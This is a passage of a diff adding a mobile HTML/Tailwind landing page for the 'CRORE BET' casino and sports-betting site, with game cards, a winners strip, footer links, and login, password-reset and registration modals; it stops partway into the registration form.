@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>CRORE BET - Online Casino & Sports</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #ffffff;
+      color: #111827;
+      padding-bottom: 75px;
+      -webkit-tap-highlight-color: transparent;
+    }
+    /* Hide scrollbar for horizontal scroll */
+    .no-scrollbar::-webkit-scrollbar {
+      display: none;
+    }
+    .no-scrollbar {
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+    }
+    .brand-yellow {
+      background-color: #f6b900;
+    }
+    .brand-green {
+      background-color: #00b843;
+    }
+    .brand-text-yellow {
+      color: #f6b900;
+    }
+  </style>
+</head>
+<body class="max-w-md mx-auto bg-white shadow-xl min-h-screen relative overflow-x-hidden">
+
+  <!-- TOP STICKY HEADER -->
+  <header class="sticky top-0 z-30 bg-white border-b border-gray-100 px-3 py-2.5 flex items-center justify-between">
+    <!-- Left: Hamburger & Support -->
+    <div class="flex items-center gap-3.5">
+      <button onclick="openDrawer()" class="text-gray-800 text-xl focus:outline-none">
+        <i class="fa-solid fa-bars"></i>
+      </button>
+      <a href="#support" class="text-gray-800 text-xl">
+        <i class="fa-solid fa-headset"></i>
+      </a>
+    </div>
+
+    <!-- Center: CRORE BET Logo -->
+    <a href="#" class="bg-black text-white font-black tracking-tight px-2.5 py-1 rounded-md text-sm flex items-center gap-1 shadow-sm">
+      <span>CRORE</span>
+      <span class="bg-[#f6b900] text-black px-1.5 py-0.2 rounded text-xs font-extrabold">BET</span>
+    </a>
+
+    <!-- Right: iOS & Android App Icons -->
+    <div class="flex items-center gap-3">
+      <a href="#download-ios" class="text-gray-700 text-xl">
+        <i class="fa-brands fa-apple"></i>
+      </a>
+      <a href="#download-android" class="relative text-gray-700 text-xl flex flex-col items-center">
+        <i class="fa-brands fa-android"></i>
+        <span class="bg-[#f6b900] text-black text-[8px] font-extrabold px-1 rounded leading-tight -mt-1">NEW</span>
+      </a>
+    </div>
+  </header>
+
+  <!-- LOG IN / REGISTRATION BUTTONS -->
+  <div class="px-3 py-3 grid grid-cols-2 gap-2.5 bg-white">
+    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 text-gray-900 font-extrabold text-sm py-3 rounded-xl shadow-sm transition active:scale-95">
+      LOG IN
+    </button>
+    <button onclick="openModal('registerModal')" class="brand-green hover:bg-green-600 text-white font-extrabold text-sm py-3 rounded-xl shadow-sm transition active:scale-95">
+      REGISTRATION
+    </button>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <main class="space-y-6 pt-1">
+
+    <!-- SECTION: TOP SLOTS -->
+    <section class="px-3">
+      <div class="flex items-center justify-between mb-2.5">
+        <div class="flex items-center gap-2">
+          <span class="font-black text-xl italic text-gray-800">7</span>
+          <h2 class="font-extrabold text-base text-gray-900">TOP Slots</h2>
+        </div>
+        <a href="#" class="text-xs font-medium text-gray-500 flex items-center gap-1">
+          More games <i class="fa-solid fa-chevron-right text-[10px]"></i>
+        </a>
+      </div>
+
+      <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
+        <!-- Card 1 -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer group">
+          <div class="h-28 rounded-xl bg-gradient-to-br from-blue-700 via-indigo-800 to-amber-600 p-2.5 flex flex-col justify-between items-center text-center shadow-md relative overflow-hidden">
+            <span class="text-[10px] font-bold text-yellow-300 uppercase tracking-wider">Fortune Garuda</span>
+            <span class="text-3xl font-black text-yellow-400 drop-shadow">500</span>
+            <span class="bg-red-600 text-white text-[9px] font-bold px-2 py-0.5 rounded">JILI</span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5 truncate">Fortune Garuda 500</p>
+        </div>
+
+        <!-- Card 2 -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer group">
+          <div class="h-28 rounded-xl bg-gradient-to-br from-amber-500 via-orange-600 to-red-700 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
+            <span class="text-2xl font-black text-yellow-200 drop-shadow">777</span>
+            <span class="text-sm font-black text-white tracking-wide">COINS</span>
+            <span class="bg-black/60 text-yellow-300 text-[9px] font-bold px-2 py-0.5 rounded">3 OAKS</span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5 truncate">777 Coins</p>
+        </div>
+
+        <!-- Card 3 -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer group">
+          <div class="h-28 rounded-xl bg-gradient-to-br from-emerald-500 via-teal-600 to-cyan-800 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
+            <span class="text-[10px] font-bold text-white uppercase">Super Ace</span>
+            <span class="text-2xl font-black text-yellow-300">♠️ A</span>
+            <span class="bg-red-600 text-white text-[9px] font-bold px-2 py-0.5 rounded">JILI</span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5 truncate">Super Ace</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION: POPULAR GAMES -->
+    <section class="px-3">
+      <div class="flex items-center justify-between mb-2.5">
+        <div class="flex items-center gap-2">
+          <i class="fa-solid fa-dice text-gray-800 text-lg"></i>
+          <h2 class="font-extrabold text-base text-gray-900">Popular Games</h2>
+        </div>
+        <a href="#" class="text-xs font-medium text-gray-500 flex items-center gap-1">
+          More games <i class="fa-solid fa-chevron-right text-[10px]"></i>
+        </a>
+      </div>
+
+      <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
+        <!-- JetX -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer">
+          <div class="h-28 rounded-xl bg-gradient-to-b from-gray-900 via-amber-800 to-amber-500 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
+            <i class="fa-solid fa-jet-fighter-up text-yellow-400 text-xl self-end"></i>
+            <span class="text-2xl font-black italic text-yellow-300 tracking-tight">JetX</span>
+            <span class="text-[9px] font-bold text-white/90 uppercase">SmartSoft</span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5">JetX</p>
+        </div>
+
+        <!-- Coin Volcano -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer">
+          <div class="h-28 rounded-xl bg-gradient-to-br from-yellow-500 via-red-600 to-red-900 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
+            <span class="text-xs font-black text-yellow-200 uppercase">Coin</span>
+            <span class="text-base font-black text-white leading-tight">VOLCANO</span>
+            <span class="bg-black/60 text-yellow-300 text-[9px] font-bold px-2 py-0.5 rounded">3 OAKS</span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Coin Volcano</p>
+        </div>
+
+        <!-- Aviator -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer">
+          <div class="h-28 rounded-xl bg-gradient-to-br from-red-600 via-rose-700 to-gray-900 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
+            <i class="fa-solid fa-plane-departure text-white text-2xl mt-2"></i>
+            <span class="text-lg font-black italic text-white">Aviator</span>
+            <span class="text-[9px] font-bold text-gray-300 uppercase">SPRIBE</span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Aviator</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION: LAST WINNERS -->
+    <section class="px-3">
+      <div class="flex items-center gap-2 mb-2.5">
+        <i class="fa-solid fa-trophy text-gray-800 text-base"></i>
+        <h2 class="font-extrabold text-base text-gray-900">Last Winners</h2>
+      </div>
+
+      <div class="flex gap-2.5 overflow-x-auto no-scrollbar pb-1">
+        <!-- Winner 1 -->
+        <div class="min-w-[205px] bg-gray-50 border border-gray-100 rounded-xl p-2 flex items-center gap-2.5 shadow-sm">
+          <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-red-600 to-amber-600 flex items-center justify-center text-white font-black text-xs shrink-0">
+            777
+          </div>
+          <div class="overflow-hidden">
+            <p class="font-extrabold text-xs text-gray-900">₹ 31,614</p>
+            <p class="text-[11px] font-semibold text-gray-700 truncate">Burning Chilli X</p>
+            <p class="text-[10px] text-gray-400 truncate">r***@gmail.co...</p>
+          </div>
+        </div>
+
+        <!-- Winner 2 -->
+        <div class="min-w-[205px] bg-gray-50 border border-gray-100 rounded-xl p-2 flex items-center gap-2.5 shadow-sm">
+          <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-amber-500 to-yellow-700 flex items-center justify-center text-white font-black text-xs shrink-0">
+            GEMS
+          </div>
+          <div class="overflow-hidden">
+            <p class="font-extrabold text-xs text-gray-900">₹ 43,739</p>
+            <p class="text-[11px] font-semibold text-gray-700 truncate">Fortune Gems 2</p>
+            <p class="text-[10px] text-gray-400 truncate">u***@gmail.co...</p>
+          </div>
+        </div>
+
+        <!-- Winner 3 -->
+        <div class="min-w-[205px] bg-gray-50 border border-gray-100 rounded-xl p-2 flex items-center gap-2.5 shadow-sm">
+          <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-orange-600 to-red-800 flex items-center justify-center text-white font-black text-xs shrink-0">
+            XXL
+          </div>
+          <div class="overflow-hidden">
+            <p class="font-extrabold text-xs text-gray-900">₹ 38,802</p>
+            <p class="text-[11px] font-semibold text-gray-700 truncate">Power Sun XXL</p>
+            <p class="text-[10px] text-gray-400 truncate">h***@hotmail....</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION: CROREBET EXCLUSIVES -->
+    <section class="px-3">
+      <div class="flex items-center justify-between mb-2.5">
+        <div class="flex items-center gap-2">
+          <i class="fa-solid fa-sparkles text-gray-800 text-base"></i>
+          <h2 class="font-extrabold text-base text-gray-900">Crorebet Exclusives</h2>
+        </div>
+        <a href="#" class="text-xs font-medium text-gray-500 flex items-center gap-1">
+          More games <i class="fa-solid fa-chevron-right text-[10px]"></i>
+        </a>
+      </div>
+
+      <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
+        <!-- Chicken Road 2 -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer">
+          <div class="h-28 rounded-xl bg-gradient-to-br from-orange-500 to-red-600 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
+            <span class="text-2xl">🐔</span>
+            <span class="text-sm font-black text-yellow-200 leading-tight">CHICKEN ROAD 2</span>
+            <span class="bg-black text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded">CRORE <span class="text-[#f6b900]">BET</span></span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Chicken Road 2</p>
+        </div>
+
+        <!-- Chicken Road -->
+        <div onclick="openModal('loginModal')" class="min-w-[155px] cursor-pointer">
+          <div class="h-28 rounded-xl bg-gradient-to-br from-indigo-600 to-slate-800 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
+            <span class="text-2xl">🐓</span>
+            <span class="text-sm font-black text-yellow-300 leading-tight">CHICKEN ROAD</span>
+            <span class="bg-black text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded">CRORE <span class="text-[#f6b900]">BET</span></span>
+          </div>
+          <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Chicken Road</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- YELLOW FOOTER LINKS BLOCK -->
+    <footer class="mt-4">
+      <div class="brand-yellow px-5 py-7 grid grid-cols-2 gap-y-7 gap-x-4 text-gray-900">
+        <!-- Casino -->
+        <div>
+          <h3 class="font-extrabold text-sm mb-3">Casino</h3>
+          <ul class="space-y-2.5 text-xs font-medium text-gray-800">
+            <li><a href="#">Casino</a></li>
+            <li><a href="#">Live Casino</a></li>
+            <li><a href="#">TV Games</a></li>
+            <li><a href="#">Crorebet App</a></li>
+          </ul>
+        </div>
+
+        <!-- Sport -->
+        <div>
+          <h3 class="font-extrabold text-sm mb-3">Sport</h3>
+          <ul class="space-y-2.5 text-xs font-medium text-gray-800">
+            <li><a href="#">Live</a></li>
+            <li><a href="#">Upcoming Events</a></li>
+            <li><a href="#">Betting Rules</a></li>
+          </ul>
+        </div>
+
+        <!-- General -->
+        <div>
+          <h3 class="font-extrabold text-sm mb-3">General</h3>
+          <ul class="space-y-2.5 text-xs font-medium text-gray-800">
+            <li><a href="#">Gaming Policy</a></li>
+            <li><a href="#">Support</a></li>
+          </ul>
+        </div>
+
+        <!-- Account -->
+        <div>
+          <h3 class="font-extrabold text-sm mb-3">Account</h3>
+          <ul class="space-y-2.5 text-xs font-medium text-gray-800">
+            <li><a href="#" onclick="openModal('loginModal')">Deposit</a></li>
+            <li><a href="#" onclick="openModal('loginModal')">Profile</a></li>
+            <li><a href="#" onclick="openModal('loginModal')">Bet History</a></li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- WHITE MIDDLE FOOTER: LOGO, LANGUAGE, SUPPORT & APP DOWNLOAD -->
+      <div class="bg-white px-4 py-6 flex flex-col items-center space-y-4">
+        <!-- Logo -->
+        <div class="bg-black text-white font-black tracking-tight px-3 py-1 rounded-md text-base flex items-center gap-1">
+          <span>CRORE</span>
+          <span class="bg-[#f6b900] text-black px-1.5 rounded text-sm font-extrabold">BET</span>
+        </div>
+
+        <!-- Language Selector -->
+        <div class="w-full bg-gray-100 rounded-xl px-3.5 py-2.5 flex items-center justify-between text-xs font-semibold text-gray-800">
+          <div class="flex items-center gap-2.5">
+            <span>🇮🇳</span>
+            <span>English (EN)</span>
+          </div>
+          <i class="fa-solid fa-chevron-down text-gray-500"></i>
+        </div>
+
+        <!-- Support Bar -->
+        <div class="w-full bg-gray-50 border border-gray-100 rounded-xl p-2 flex items-center justify-between">
+          <div class="flex items-center gap-2.5 pl-1">
+            <i class="fa-solid fa-headset text-gray-800 text-lg"></i>
+            <div>
+              <p class="text-xs font-bold text-gray-900">Support</p>
+              <p class="text-[10px] text-gray-500">Report problem</p>
+            </div>
+          </div>
+          <div class="flex items-center gap-1.5">
+            <a href="mailto:support@example.com" class="w-8 h-8 rounded-lg bg-gray-200 flex items-center justify-center text-gray-800 text-xs">
+              <i class="fa-solid fa-envelope"></i>
+            </a>
+            <a href="https://t.me/" target="_blank" class="w-8 h-8 rounded-lg bg-sky-500 flex items-center justify-center text-white text-sm">
+              <i class="fa-brands fa-telegram"></i>
+            </a>
+            <button class="brand-yellow text-gray-900 font-extrabold text-xs px-3.5 py-2 rounded-lg">
+              CHAT
+            </button>
+          </div>
+        </div>
+
+        <!-- Telegram Icon -->
+        <a href="https://t.me/" target="_blank" class="w-9 h-9 rounded-lg bg-sky-500 flex items-center justify-center text-white text-lg shadow-sm">
+          <i class="fa-brands fa-telegram"></i>
+        </a>
+
+        <!-- Download App Section -->
+        <p class="text-[11px] font-bold text-gray-700 tracking-wide uppercase pt-1">DOWNLOAD THE APP RIGHT NOW!</p>
+        <div class="w-full grid grid-cols-2 gap-3">
+          <a href="#download-android" class="bg-neutral-900 text-white rounded-xl py-2.5 px-3 flex items-center justify-center gap-2.5 shadow">
+            <i class="fa-brands fa-android text-2xl"></i>
+            <div class="text-left">
+              <p class="text-[9px] text-gray-300 leading-none">Download for</p>
+              <p class="text-xs font-extrabold mt-0.5">Android</p>
+            </div>
+          </a>
+          <a href="#download-ios" class="bg-neutral-900 text-white rounded-xl py-2.5 px-3 flex items-center justify-center gap-2.5 shadow">
+            <i class="fa-brands fa-apple text-2xl"></i>
+            <div class="text-left">
+              <p class="text-[9px] text-gray-300 leading-none">Download for</p>
+              <p class="text-xs font-extrabold mt-0.5">iOS</p>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- YELLOW PROVIDERS GRID & ACCORDIONS -->
+      <div class="brand-yellow px-3 py-6 space-y-5">
+        <div class="grid grid-cols-3 gap-2">
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-black text-xs text-gray-900">SPRIBE</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-black text-xs text-gray-900">3 OAKS</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-black text-sm text-gray-900">JILI</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-extrabold text-xs text-gray-900">Evolution</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-black text-xs text-gray-900">ICONIC21</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-black text-xs text-gray-900">HACKSAW</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-extrabold text-xs text-gray-900">Aviatrix</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-black text-xs text-gray-900">ela GAMES</div>
+          <div class="bg-yellow-500/40 rounded-lg py-3 px-2 flex items-center justify-center font-black text-[10px] text-gray-900">CRORE BET</div>
+        </div>
+
+        <!-- Accordions -->
+        <div class="space-y-2">
+          <details class="bg-white rounded-xl px-4 py-3 text-xs font-bold text-gray-900 shadow-sm">
+            <summary class="list-none flex items-center justify-between cursor-pointer">
+              <span>Legal Info</span>
+              <i class="fa-solid fa-chevron-down text-gray-500"></i>
+            </summary>
+            <p class="mt-2 font-normal text-gray-600">18+ Only. Play responsibly. Licensed gaming platform terms apply.</p>
+          </details>
+
+          <details class="bg-white rounded-xl px-4 py-3 text-xs font-bold text-gray-900 shadow-sm">
+            <summary class="list-none flex items-center justify-between cursor-pointer">
+              <span>Sport</span>
+              <i class="fa-solid fa-chevron-down text-gray-500"></i>
+            </summary>
+            <p class="mt-2 font-normal text-gray-600">Cricket, Football, Tennis, Kabaddi & Live Sports Markets.</p>
+          </details>
+
+          <details class="bg-white rounded-xl px-4 py-3 text-xs font-bold text-gray-900 shadow-sm">
+            <summary class="list-none flex items-center justify-between cursor-pointer">
+              <span>Casino</span>
+              <i class="fa-solid fa-chevron-down text-gray-500"></i>
+            </summary>
+            <p class="mt-2 font-normal text-gray-600">Slots, Crash Games, Roulette, Teen Patti, Andar Bahar & Live Dealers.</p>
+          </details>
+        </div>
+
+        <p class="text-[11px] text-gray-800 text-center pt-1">Copyright © 2026 Crorebet. All rights reserved.</p>
+      </div>
+    </footer>
+  </main>
+
+  <!-- FIXED BOTTOM NAVIGATION BAR -->
+  <nav class="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-white border-t border-gray-200 px-2 py-1.5 flex items-center justify-around z-30">
+    <a href="#" class="flex flex-col items-center text-gray-900 border-b-2 border-gray-900 pb-0.5 px-1">
+      <i class="fa-solid fa-table-cells-large text-base"></i>
+      <span class="text-[10px] font-bold mt-0.5">Main</span>
+    </a>
+    <a href="#" class="flex flex-col items-center text-gray-500 hover:text-gray-900 px-1">
+      <i class="fa-solid fa-trophy text-base"></i>
+      <span class="text-[10px] font-medium mt-0.5">Live</span>
+    </a>
+    <a href="#" class="flex flex-col items-center text-gray-500 hover:text-gray-900 px-1">
+      <i class="fa-solid fa-dice text-base"></i>
+      <span class="text-[10px] font-medium mt-0.5">Casino</span>
+    </a>
+    <a href="#" class="flex flex-col items-center text-gray-500 hover:text-gray-900 px-1">
+      <i class="fa-solid fa-user-tie text-base"></i>
+      <span class="text-[10px] font-medium mt-0.5">Live Dealers</span>
+    </a>
+    <a href="#" onclick="openModal('loginModal')" class="flex flex-col items-center text-red-600 px-1">
+      <i class="fa-solid fa-plane text-base"></i>
+      <span class="text-[10px] font-bold mt-0.5">Aviator</span>
+    </a>
+    <a href="#" class="flex flex-col items-center text-gray-500 hover:text-gray-900 px-1">
+      <i class="fa-solid fa-gift text-base"></i>
+      <span class="text-[10px] font-medium mt-0.5">Bonuses</span>
+    </a>
+  </nav>
+
+  <!-- SIDE MENU DRAWER (Image 5) -->
+  <div id="sideDrawer" class="fixed inset-0 z-50 bg-white max-w-md mx-auto hidden flex-col justify-between p-4 overflow-y-auto">
+    <div>
+      <!-- Top Bar -->
+      <div class="flex items-center gap-4 pb-4">
+        <button onclick="closeDrawer()" class="text-gray-800 text-xl">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+        <div class="bg-black text-white font-black tracking-tight px-2.5 py-1 rounded-md text-sm flex items-center gap-1">
+          <span>CRORE</span>
+          <span class="bg-[#f6b900] text-black px-1.5 rounded text-xs font-extrabold">BET</span>
+        </div>
+      </div>
+
+      <!-- Main Pages -->
+      <p class="text-[11px] font-bold text-gray-400 uppercase mb-2">MAIN PAGES</p>
+      <div class="grid grid-cols-2 gap-2.5 mb-5">
+        <a href="#" onclick="closeDrawer()" class="bg-gray-100 rounded-xl p-3 flex items-center gap-2.5 text-xs font-bold text-gray-900">
+          <i class="fa-solid fa-clover text-base"></i> Casino
+        </a>
+        <a href="#" onclick="closeDrawer()" class="bg-gray-100 rounded-xl p-3 flex items-center gap-2.5 text-xs font-bold text-gray-900">
+          <i class="fa-solid fa-futbol text-base"></i> Sport
+        </a>
+        <a href="#" onclick="closeDrawer()" class="bg-gray-100 rounded-xl p-3 flex items-center gap-2.5 text-xs font-bold text-gray-900">
+          <i class="fa-solid fa-rocket text-base"></i> Crash Games
+        </a>
+        <a href="#" onclick="closeDrawer()" class="bg-gray-100 rounded-xl p-3 flex items-center gap-2.5 text-xs font-bold text-gray-900">
+          <i class="fa-solid fa-user-tie text-base"></i> Live Dealers
+        </a>
+      </div>
+
+      <!-- Account -->
+      <p class="text-[11px] font-bold text-gray-400 uppercase mb-2">ACCOUNT</p>
+      <div class="space-y-2.5 mb-5">
+        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+          <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-user"></i></span>
+          Profile
+        </button>
+        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+          <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-clock-rotate-left"></i></span>
+          Payment History
+        </button>
+        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+          <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-fire"></i></span>
+          Bet History
+        </button>
+        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+          <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-dollar-sign"></i></span>
+          Money Withdrawal
+        </button>
+      </div>
+
+      <!-- Support & Settings -->
+      <p class="text-[11px] font-bold text-gray-400 uppercase mb-2">SUPPORT & SETTINGS</p>
+      <div class="space-y-3">
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-3">
+            <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-headset"></i></span>
+            <div>
+              <p class="text-xs font-bold text-gray-900">Support</p>
+              <p class="text-[10px] text-gray-500">We're always here for you</p>
+            </div>
+          </div>
+          <span class="bg-green-100 text-green-700 text-[10px] font-bold px-2.5 py-1 rounded-full flex items-center gap-1">
+            <span class="w-1.5 h-1.5 rounded-full bg-green-600"></span> 24/7
+          </span>
+        </div>
+
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-3">
+            <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center">🇮🇳</span>
+            <span class="text-xs font-bold text-gray-900">English</span>
+          </div>
+          <i class="fa-solid fa-chevron-down text-xs text-gray-500"></i>
+        </div>
+      </div>
+    </div>
+
+    <div class="pt-6 space-y-3">
+      <p class="text-[10px] text-gray-400 text-center">18+ | Copyright © 2026 crorebet. | All rights reserved and protected by law</p>
+      <button onclick="closeDrawer(); openModal('loginModal')" class="w-full brand-green text-white font-extrabold text-sm py-3 rounded-xl shadow">
+        DEPOSIT
+      </button>
+    </div>
+  </div>
+
+  <!-- MODAL 1: LOG IN (Images 6 & 7) -->
+  <div id="loginModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
+    <div class="bg-white w-full max-w-sm rounded-2xl p-5 relative shadow-2xl">
+      <div class="flex items-center justify-between mb-4">
+        <i class="fa-regular fa-comments text-gray-700 text-lg"></i>
+        <h3 class="font-extrabold text-base text-gray-900">LOG IN</h3>
+        <button onclick="closeModals()" class="w-7 h-7 rounded-lg bg-gray-100 text-gray-600 flex items-center justify-center">
+          <i class="fa-solid fa-xmark text-xs"></i>
+        </button>
+      </div>
+
+      <p class="text-xs text-gray-600 mb-3">
+        New user? <button onclick="switchModal('registerModal')" class="font-bold text-[#f6b900]">Registration</button>
+      </p>
+
+      <!-- Tabs: Email or ID / Phone -->
+      <div class="grid grid-cols-2 gap-2 mb-3">
+        <button id="tabEmailBtn" onclick="switchLoginTab('email')" class="bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
+          <i class="fa-solid fa-envelope"></i> Email or ID
+        </button>
+        <button id="tabPhoneBtn" onclick="switchLoginTab('phone')" class="brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
+          <i class="fa-solid fa-phone"></i> Phone
+        </button>
+      </div>
+
+      <form onsubmit="handleFormSubmit(event, 'Login')" class="space-y-3">
+        <!-- Phone Input -->
+        <div id="phoneInputWrap" class="flex bg-gray-100 rounded-xl overflow-hidden">
+          <span class="px-3 py-3 text-xs font-bold text-gray-800 border-r border-gray-200 flex items-center gap-1.5">
+            🇮🇳 +91
+          </span>
+          <input type="tel" placeholder="Phone number" class="w-full bg-transparent px-3 py-3 text-xs focus:outline-none" />
+        </div>
+
+        <!-- Email Input -->
+        <div id="emailInputWrap" class="hidden bg-gray-100 rounded-xl overflow-hidden">
+          <input type="text" placeholder="Email/Account ID" class="w-full bg-transparent px-3.5 py-3 text-xs focus:outline-none" />
+        </div>
+
+        <!-- Password Input -->
+        <div class="flex items-center bg-gray-100 rounded-xl px-3.5">
+          <input id="loginPass" type="password" placeholder="Password" class="w-full bg-transparent py-3 text-xs focus:outline-none" />
+          <button type="button" onclick="togglePass('loginPass')" class="text-gray-500 text-xs">
+            <i class="fa-regular fa-eye-slash"></i>
+          </button>
+        </div>
+
+        <p class="text-xs text-gray-600">
+          Forgot password? <button type="button" onclick="switchModal('resetModal')" class="font-bold text-[#f6b900]">Reset</button>
+        </p>
+
+        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f6b900] text-gray-600 hover:text-gray-900 font-extrabold text-xs py-3.5 rounded-xl transition">
+          LOG IN
+        </button>
+      </form>
+
+      <div class="flex items-center gap-2 my-3.5">
+        <div class="h-px bg-gray-200 flex-1"></div>
+        <span class="text-[11px] font-bold text-gray-500">OR</span>
+        <div class="h-px bg-gray-200 flex-1"></div>
+      </div>
+
+      <button onclick="alert('Google OAuth connect karein')" class="w-full bg-blue-600 text-white rounded-full py-2 px-4 flex items-center justify-between text-xs font-semibold shadow">
+        <span>Continue with Google</span>
+        <span class="w-6 h-6 rounded-full bg-white text-blue-600 flex items-center justify-center font-black">G</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- MODAL 2: RECOVER PASSWORD (Image 8) -->
+  <div id="resetModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
+    <div class="bg-white w-full max-w-sm rounded-2xl p-5 relative shadow-2xl">
+      <div class="flex items-center justify-between mb-4">
+        <span class="w-7"></span>
+        <h3 class="font-extrabold text-base text-gray-900">Recover a password</h3>
+        <button onclick="closeModals()" class="w-7 h-7 rounded-lg bg-gray-100 text-gray-600 flex items-center justify-center">
+          <i class="fa-solid fa-xmark text-xs"></i>
+        </button>
+      </div>
+
+      <div class="grid grid-cols-2 gap-2 mb-4">
+        <button class="brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
+          <i class="fa-solid fa-envelope"></i> Email
+        </button>
+        <button class="bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
+          <i class="fa-solid fa-phone"></i> Phone
+        </button>
+      </div>
+
+      <p class="text-xs text-gray-600 text-center mb-4">Fill your email and we send you new password</p>
+
+      <form onsubmit="handleFormSubmit(event, 'Password Reset')" class="space-y-2.5">
+        <input type="email" placeholder="Email" required class="w-full bg-gray-100 rounded-xl px-3.5 py-3 text-xs focus:outline-none" />
+        <button type="button" onclick="switchModal('loginModal')" class="w-full border border-gray-200 text-gray-900 font-bold text-xs py-3 rounded-xl">
+          Back
+        </button>
+        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f6b900] text-gray-600 hover:text-gray-900 font-extrabold text-xs py-3 rounded-xl transition">
+          Reset
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- MODAL 3: REGISTRATION (Image 9) -->
+  <div id="registerModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
+    <div class="bg-white w-full max-w-sm rounded-2xl p-5 relative shadow-2xl max-h-[90vh] overflow-y-auto">
+      <div class="flex items-center justify-between mb-3">
+        <i class="fa-regular fa-comments text-gray-700 text-lg"></i>
+        <h3 class="font-extrabold text-base text-gray-900">REGISTRATION</h3>
+        <button onclick="closeModals()" class="w-7 h-7 rounded-lg bg-gray-100 text-gray-600 flex items-center justify-center">
+          <i class="fa-solid fa-xmark text-xs"></i>
+        </button>
+      </div>
+
